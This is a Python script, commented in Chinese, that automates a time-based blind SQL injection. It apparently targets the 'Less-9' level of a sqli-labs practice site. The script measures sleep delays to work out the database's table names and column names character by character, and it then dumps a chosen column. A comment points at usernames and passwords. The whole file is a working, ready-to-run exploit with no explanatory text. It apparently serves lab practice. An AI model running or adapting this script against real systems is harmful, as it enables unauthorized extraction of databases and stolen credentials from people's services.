import requests
import time


def req(url):
    start = time.time()
    requests.get(url=url)
    end = time.time() - start
    if end > hour:
        return True
    return False


hour = 1.5
len = 0
# 截取表名的长度
for length in range(1, 500):
    flag = req(f"http://sqli.com/Less-9/?id=1' and if (length((select group_concat(table_name) from information_schema.tables where table_schema = schema())) = {length}, sleep({hour}), sleep(0) )--+")
    if flag:
        print(f"表名的长度为：{length}")
        len = length
        break

# 截取表名的内容
tables = []
tmp = ''
for length in range(1, len + 1):
    for a in range(33, 127):             # ascii码 33-126
        flag = req(f"http://sqli.com/Less-9/?id=1' and if (substr((select group_concat(table_name) from information_schema.tables where table_schema = schema()),{length},1) = '{chr(a)}', sleep({hour}), sleep(0) )--+")
        if flag:
            print(f"{chr(a)}", end='')
            tmp += chr(a)
            break

tables = tmp.split(',')       # EMAILS,REFERERS,UAGENTS,USERS
print('')
print(tables)
index = int(input("请输入要爆破的表名："))
table_name = tables[index - 1]

# 截取数据库的列名的长度
column_len = 0
for length in range(1, 500):
    flag = req(f"http://sqli.com/Less-9/?id=1' and if (length((select group_concat(column_name) from information_schema.columns where table_schema = schema() and table_name ='{table_name}')) = {length}, sleep({hour}), sleep(0) )--+")
    if flag:
        print(f"列名的长度为：{length}")
        column_len = length
        break

# 截取数据库的列名的内容
columns = []
tmp = ''
for length in range(1, column_len + 1):
    for a in range(33, 127):
        flag = req(f"http://sqli.com/Less-9/?id=1' and if (substr((select group_concat(column_name) from information_schema.columns where table_schema = schema() and table_name ='{table_name}'),{length},1) = '{chr(a)}', sleep({hour}), sleep(0) )--+")
        if flag:
            print(f"{chr(a)}", end ='')
            tmp += chr(a)
            break
columns = tmp.split(',')
print('')
print(columns)
column_name = input("请输入要爆破的列名:")

# 爆破数据库列名下的表格的长度
content_len = 0
for length in range(1, 10000):
    flag = req(f"http://sqli.com/Less-9/?id=1' and if (length((select group_concat({column_name}) from {table_name})) = {length}, sleep({hour}), sleep(0) )--+")
    if flag:
        print(f"{table_name}\t{column_name}\t长度是:{length}")
        content_len = length
        break

# 爆破数据库列名下的表格的数据        select (username,password) from users
for length in range(1, content_len + 1):
    for a in range(33, 127):
        flag = req(f"http://sqli.com/Less-9/?id=1' and if (substr((select group_concat({column_name}) from {table_name}),{length},1) = '{chr(a)}', sleep({hour}), sleep(0) )--+")
        if flag:
            print(f"{chr(a)}", end='')
            break